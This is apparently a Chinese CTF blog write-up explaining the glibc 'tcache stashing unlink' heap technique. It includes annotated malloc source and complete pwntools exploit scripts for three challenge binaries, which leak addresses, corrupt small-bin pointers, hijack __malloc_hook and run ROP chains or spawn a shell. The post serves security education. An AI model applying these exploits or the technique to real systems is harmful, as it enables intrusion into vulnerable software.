---
title: tcache stashing unlink
tags:
  - binary
---

# tcache stashing unlink

## 知识分析

static void * __int_malloc(mstate av, size_t bytes)中的一段代码：

```c
if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        {
          bck = victim->bk;
	  if (__glibc_unlikely (bck->fd != victim))
	    malloc_printerr ("malloc(): smallbin double linked list corrupted");
          set_inuse_bit_at_offset (victim, nb);
          bin->bk = bck;
          bck->fd = bin;

          if (av != &main_arena)
	    set_non_main_arena (victim);
          check_malloced_chunk (av, victim, nb);
#if USE_TCACHE
	  /* While we're here, if we see other chunks of the same size,
	     stash them in the tcache.  */
	  size_t tc_idx = csize2tidx (nb);
	  if (tcache && tc_idx < mp_.tcache_bins)
	    {
	      mchunkptr tc_victim;

	      /* While bin not empty and tcache not full, copy chunks over.  */
	      while (tcache->counts[tc_idx] < mp_.tcache_count
		     && (tc_victim = last (bin)) != bin)
		{
		  if (tc_victim != 0)
		    {
		      bck = tc_victim->bk;
		      set_inuse_bit_at_offset (tc_victim, nb);
		      if (av != &main_arena)
			set_non_main_arena (tc_victim);
		      bin->bk = bck;
		      bck->fd = bin;

		      tcache_put (tc_victim, tc_idx);
	            }
		}
	    }
#endif
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }
```

由于缺少对small bin的检测，导致了可以在任意地址写入一个libc地址。

```c
// 获取 small bin 中倒数第二个 chunk 。
bck = victim->bk;
// 检查 bck->fd 是不是 victim，防止伪造
if ( __glibc_unlikely( bck->fd != victim ) )
    malloc_printerr ("malloc(): smallbin double linked list corrupted");
// 设置 victim 对应的 inuse 位
set_inuse_bit_at_offset (victim, nb);
// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来
bin->bk = bck;
bck->fd = bin;
```

控制small bin最后一个chunk的bk，绕过检查，就可以实现任意写。

如果有了calloc函数，就可以绕过tcache直接从small bin里面取chunk。同时，tcache_puts没有什么检查机制。当Tcache存在两个以上的空位时，程序会将我们的fake chunk置入Tcache。

利用思路1：
1. 将chunk in small bin将要放入tcache bin填到只有一个空位置。
2. 通过切割造出两个small bin。
3. 修改small bin的victim->bk->fd指向victim，修改victim->bk>bk指向任意地址准备写入。
4. 申请一个同大小的chunk，执行成功。

**留一个空位置**是因为遍历只执行一次，保证在fuck_addr->bk不合法的情况下不进行遍历，使程序继续运行。



如果**留两个空位置**，又是一种利用思路。

我们需要能够控制fuck_addr1。由于我们修改了small bin链，第一次遍历时后进入的small chunk会进入tcache bin。第二次遍历fuck_addr1+0x10会进入tcache bin，之后可以取出它。在fuck_addr1+0x18填入fuck_addr2，执行bck->fd=bin，fuck_addr2就填入了一个libc地址。

利用思路2：

1. 将chunk in small bin将要放入tcache bin填到只有**两**个空位置。
2. 造出两个small bin
3. 修改fuck_addr1+0x18为fuck_addr2，修改bck的bk为fuck_addr1
4. 申请一个同大小的chunk。执行完毕之后fuck_addr1+0x10进tcache bin，fuck_addr2+0x10写入了一个libc地址。

## 例题分析

### hitcon_ctf_2019_one_punch

#### 分析一下

```c
$ file hitcon_ctf_2019_one_punch
hitcon_ctf_2019_one_punch: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5119a694655e3e6c936dc894e82e07ec0bbee32d, for GNU/Linux 3.2.0, stripped
 checksec hitcon_ctf_2019_one_punch
[*] '/home/surager/work/hitcon_ctf_2019_one_punch'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

64位ELF文件，保护全开。

```c
v4 = __readfsqword(0x28u);
  my_write("idx: ");
  v1 = read_int();
  if ( v1 > 2 )
    error("invalid");
  my_write("hero name: ");
  memset(s, 0, 0x400uLL);
  v2 = read(0, s, 0x400uLL);  // 根据输入字符串的长度进行分配
  if ( v2 <= 0 )
    error("io");
  s[v2 - 1] = 0;
  if ( v2 <= 0x7F || v2 > 0x400 )
    error("poor hero name");
  *(&chunklist + 2 * v1) = calloc(1uLL, v2); // 使用calloc，不从tcache中取chunk
  sizelist[2 * v1] = v2;
  strncpy(*(&chunklist + 2 * v1), s, v2);
  memset(s, 0, 0x400uLL);
  return __readfsqword(0x28u) ^ v4;
```

根据输入字符串的长度进行分配，calloc不从tcache bin中取chunk。

```c
void remove()
{
  unsigned int v0; // [rsp+Ch] [rbp-4h]

  my_write("idx: ");
  v0 = read_int();
  if ( v0 > 2 )
    error("invalid");
  free(*(&chunklist + 2 * v0));// 并没有清零，存在UAF
}
```

存在use-after-free的漏洞。

而且在输入50056时存在一个后门

```c
if ( v3 == 50056 )
          backdoor();

ssize_t backdoor()
{
  void *buf; // [rsp+8h] [rbp-8h]

  if ( *(qword_4030 + 0x20) <= 6 )
    error("gg");
  buf = malloc(0x217uLL);
  if ( !buf )
    error("err");
  if ( read(0, buf, 0x217uLL) <= 0 )
    error("io");
  puts("Serious Punch!!!");
  puts(&unk_2128);
  return puts(buf);
}

```

我们需要将`*(qword_4030 + 0x20)`处写入一个大于6的数(别直接填地址，会被认为是负数(我是这么理解的，反正没跑成功))。

```sh
$ seccomp-tools dump ./hitcon_ctf_2019_one_punch
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
```

开沙箱，考虑把malloc_hook改成`add rsp, 0x48; ret`之后在后门处进行orw rop。

通过如下的操作造两个small chunk:

```python
add(0,0x400)
add(1,0x300) # 隔开top chunk
free(0)
add(0,0x300)

add(1,0x400)
add(2,0x400)
free(1)
add(2,0x300)
add(2,0x300)
```

#### 整理一下？

1. 程序有后门，考虑先把后门条件改成满足。
2. 程序使用calloc，考虑用tcache stashing unlink。
3. 提前布置好tcache链，两次调用后门改malloc_hook。
4. 进行rop。

#### exp

```python
from pwn import *
io = process("./hitcon_ctf_2019_one_punch")
#io = remote("node3.buuoj.cn",25062)
elf = ELF("./hitcon_ctf_2019_one_punch")
libc = ELF("./x64-libc-2.29.so")
#context.log_level = 'debug'

def add(idx,name):
    io.sendlineafter("> ",'1')
    io.sendlineafter("idx: ",str(idx))
    io.sendafter("hero name: ",name)

def edit(idx,name):
    io.sendlineafter("> ",'2')
    io.sendlineafter("idx: ",str(idx))
    io.sendafter("hero name: ",name)

def free(idx):
    io.sendlineafter("> ",'4')
    io.sendlineafter("idx: ",str(idx))

def show(idx):
    io.sendlineafter("> ",'3')
    io.sendlineafter("idx: ",str(idx))

def backdoor(con):
    io.sendlineafter("> ",'50056')
    io.sendline(con)

for i in range(7):
    add(0,0x1a0)
    free(0)
show(0)
io.recvuntil('name: ')
heap_addr = u64(io.recv(6).ljust(8,'\x00')) - 0xad0
log.info(hex(heap_addr))
add(0,0x1a0)
add(1,'a'*0x10+'/flag\x00\x00\00'+'a'*(0xf0-0x18))
free(0)
show(0)
libc_base = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 0x1e4ca0
log.info(hex(libc_base))
add(0,0x1a0)

# create two small chunk
for i in range(6):
    add(0,0xf0)
    free(0)
for i in range(7):
    add(0,0x400)
    free(0)
add(0,0x400)
add(1,0x300)
free(0)
add(0,0x300)

add(1,0x400)
add(2,0x400)
free(1)
add(2,0x300)
add(2,0x300)

payload = '\x00'*0x300+p64(0)+p64(0x101) + p64(heap_addr+0x3650) + p64(heap_addr+0x20-0x5)
edit(1,payload)
add(0,0x217)
free(0)
edit(0,p64(libc_base+libc.sym['__malloc_hook']))
add(0,0xf0) # 


add_rsp = libc_base + 0x000000000008cfd6
backdoor('a')
backdoor(p64(add_rsp))

rdi = libc_base + 0x0000000000026542
rsi = libc_base + 0x0000000000026f9e
rdx = libc_base + 0x000000000012bda6
rax = libc_base + 0x0000000000047cf8
syscall = libc_base + 0xCf6c5
flag_add = heap_addr + 0xff0

rop = p64(rdi) + p64(flag_add) + p64(rsi) + p64(0) + p64(rdx) + p64(0)+p64(rax)+ p64(2) + p64(syscall)
rop += p64(rdi) + p64(3) + p64(rsi) + p64(flag_add) + p64(rdx) + p64(0x30) + p64(rax) + p64(0) + p64(syscall)
rop += p64(rdi) + p64(1) + p64(rsi) + p64(flag_add) + p64(rdx) + p64(0x30) + p64(rax) + p64(1) + p64(syscall)
add(0,rop)

io.interactive()

```

### buuoj[2020 新春红包题] 3

#### 分析

```sh
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x07 0x00 0x40000000  if (A >= 0x40000000) goto 0011
 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011
 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010
 0006: 0x20 0x00 0x00 0x00000024  A = count >> 32 # write(fd, buf, count)
 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010
 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count)
 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

同样开了seccomp

```c
ssize_t get_redpacket()
{
  char buf; // [rsp+0h] [rbp-80h]

  if ( *(qword_4058 + 2048) <= 139637976727552LL || *(qword_4058 + 0x7F8) || *(qword_4058 + 0x808) )
    default();
  puts("You get red packet!");
  printf("What do you want to say?");
  return read(0, &buf, 0x90uLL);
}
```

同样开了后门

```c
printf("How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ");
```

只不过是只能calloc固定大小的chunk而已。

后orw的时候选择在chunk里面构造rop链，在后门进行栈迁移。

#### exp

```python
from pwn import *
#io = process("./RedPacket_SoEasyPwn1")
io = remote("node3.buuoj.cn",26206)
elf = ELF("./RedPacket_SoEasyPwn1")
libc = ELF("./x64-libc-2.29.so")
#context.log_level = 'debug'

def add(idx,size,con):
    io.sendlineafter("Your input: ",'1')
    io.sendlineafter("idx: ",str(idx))
    io.sendlineafter("): ",str(size))
    io.sendafter("content: ",con)

def edit(idx,con):
    io.sendlineafter("Your input: ",'3')
    io.sendlineafter("idx: ",str(idx))
    io.sendafter("content: ",con)

def free(idx):
    io.sendlineafter("Your input: ",'2')
    io.sendlineafter("idx: ",str(idx))

def show(idx):
    io.sendlineafter("Your input: ",'4')
    io.sendlineafter("idx: ",str(idx))

def dbg():
    gdb.attach(io)
    pause()

for i in range(7):
    add(15,4,'a')
    free(15)
for i in range(6):
    add(14,2,'a')
    free(14)
show(15)
heap_addr = u64(io.recv(6).ljust(8,'\x00'))-0x26c0
log.info('heap_addr = '+hex(heap_addr))
add(1,4,'a')
add(13,3,'a')
free(1)
show(1)
libc_base = u64(io.recv(6).ljust(8,'\x00')) - 0x1e4ca0
log.info('libc_base = '+hex(libc_base))


add(13,3,'a')
add(13,3,'a')
add(2,4,'a')
add(13,4,'a')
free(2)
add(13,3,'a')
add(13,3,'a')
payload = '\x00'*0x300 + p64(0) + p64(0x101) + p64(heap_addr+0x37e0)+p64(heap_addr+0x250+0x10+0x800-0x10)
edit(2,payload)
add(3,2,'a')


rdi = libc_base + 0x0000000000026542
rsi = libc_base + 0x0000000000026f9e
rdx = libc_base + 0x000000000012bda6
file_name = heap_addr + 0x4a40
flag_add = file_name + 0x200
leave = libc_base + 0x0000000000058373
rop = '/flag\x00\x00\x00'
rop += p64(rdi) + p64(file_name) + p64(rsi) + p64(0) + p64(libc_base + libc.sym['open'])
rop += p64(rdi) + p64(3) + p64(rsi) + p64(flag_add) + p64(rdx) + p64(0x30) + p64(libc_base + libc.sym['read'])
rop += p64(rdi) + p64(1) + p64(rsi) + p64(flag_add) + p64(rdx) + p64(0x30) + p64(libc_base + libc.sym['write'])
add(4,4,rop)
payload = 'a'*0x80 + p64(file_name) + p64(leave)
io.sendlineafter("Your input: ",'666')
io.sendlineafter('say?',payload)
io.interactive()
```

### 高校战疫 two chunk
#### 分析

程序后门明显：

```c
__int64 setup()
{
  __int64 result; // rax

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  easy_challenge();
  result = mmap(0x23333000, 0x2000uLL, 3, 34, -1, 0LL);
  buf = result;
  return result;
}


__int64 backdoor()
{
  return (*buf)(*(buf + 6), *(buf + 7), *(buf + 8));
}
```

基本可以确定目标是向buf中填入可执行代码，构造system('/bin/sh')

```c
ssize_t leave_message()
{
  void *v0; // rsi

  printf("leave your name: ");
  v0 = buf;
  read(0, buf, 0x30uLL);
  printf("leave your message: ", v0);
  return read(0, buf + 48, 0x40uLL);
}

```

buf初始状态可控。可以考虑在tcache stashing unlink之前将需要的堆结构布置好。

```c
 if ( v3 == 23333 && dword_4020 )
  {
    *(&chunklist + 2 * v2) = malloc(0xE9uLL);   // malloc仅有一次
    --dword_4020;
  }
  else
  {
    if ( v3 <= 0x80 || v3 > 0x3FF )
      hack();
    *(&chunklist + 2 * v2) = calloc(1uLL, v3);
  }

```

```c
__int64 show()
{
  int v1; // [rsp+Ch] [rbp-4h]

  puts("just show once!");
  if ( dword_4010 != 1 )
    hack();
  printf("idx: ");
  v1 = sub_1267();
  if ( !*(&chunklist + 2 * v1) )
    hack();
  write(1, *(&chunklist + 2 * v1), 8uLL);
  return (dword_4010-- - 1);
}
```

两种分配方式，只有一次malloc、edit和show。利用这次malloc和show泄露堆地址，。

```c
__int64 leave_message2()
{
  void *buf; // ST08_8

  if ( !dword_401C )
    hack();
  printf("leave your end message: ");
  buf = malloc(0x88uLL);
  read(0, buf, 0x80uLL);
  return (dword_401C-- - 1);
}
```

注意构造的small chunk大小要是0x90的，保证leave_message的时候能malloc到。

#### 整理思路

1. 布置好buf的内容，使其能够满足tcache stashing unlink plus的条件。
2. 利用唯一一次malloc和show得到堆地址。
3. 造两个small chunk，要求第二个small chunk可控。
4. 修改bk，触发tcache stashing unlink。
5. print_buf得到libc_base，leave_message得到buf，写入system
6. 后门拿shell

#### exp

```python
from pwn import *

io = process("./twochunk")
# io = remote("")
elf = ELF("./twochunk")
libc = ELF("./x64-libc-2.29.so")


# context.log_level = 'debug'


def add(idx, size):
    io.sendlineafter("choice: ", '1')
    io.sendlineafter("idx: ", str(idx))
    io.sendlineafter("size: ", str(size))


def edit(idx, con):
    io.sendlineafter("choice: ", '4')
    io.sendlineafter("idx: ", str(idx))
    io.sendafter("content: ", con)


def free(idx):
    io.sendlineafter("choice: ", '2')
    io.sendlineafter("idx: ", str(idx))


def show(idx):
    io.sendlineafter("choice: ", '3')
    io.sendlineafter("idx: ", str(idx))


def print_buf():
    io.sendlineafter("choice: ", '5')


def leave_message(con):
    io.sendlineafter("choice: ", '6')
    io.sendlineafter("age: ", con)


def dbg():
    gdb.attach(io)
    pause()

payload = p64(0x23333000+0x20)*6
io.sendafter('name:', payload)
io.sendafter('age:', 'a' * 0x30)

add(0,233)
free(0)
add(0,233)
free(0)
add(0,23333)
show(0)
heap_addr = u64(io.recv(6).ljust(8, '\x00')) - 0x260
log.info('heap_addr = ' + hex(heap_addr))
free(0)

for i in range(5):
    add(0,0x88)
    free(0)
for i in range(7):
    add(0,0x188)
    free(0)

add(0,0x188)
add(1,0x300)
free(0)
add(0,0xf0)
free(0)
add(0,0x100)
free(0)
free(1)

add(0,0x188)
add(1,0x300)
free(0)
add(0,0xf0)
free(1)
add(1,0x100)

payload = '\x00'*0x100 + p64(0) + p64(0x91) + p64(heap_addr + 0x1310) + p64(0x23333000-0x10)
edit(0,payload)
free(1)
add(1,0x88)
print_buf()
libc_base = u64(io.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x1e4d20
log.info('libc_base = ' + hex(libc_base))
payload = p64(libc_base + libc.sym['system']) + p64(libc_base + libc.search('/bin/sh').next()) * 10
leave_message(payload)
io.sendlineafter('choice: ', '7')
io.sendline('cat flag')
io.interactive()

```

## 总结

这种利用技术适用于目前2.27以上的版本。固定套路同时也固定了程序的特性。限制条件也不算太多。按照三步走就可以了。`申请两个small chunk`、`修改bk`、`触发tcache  stashing unlink `。同时写入的地址和分配的地址由程序具体决定。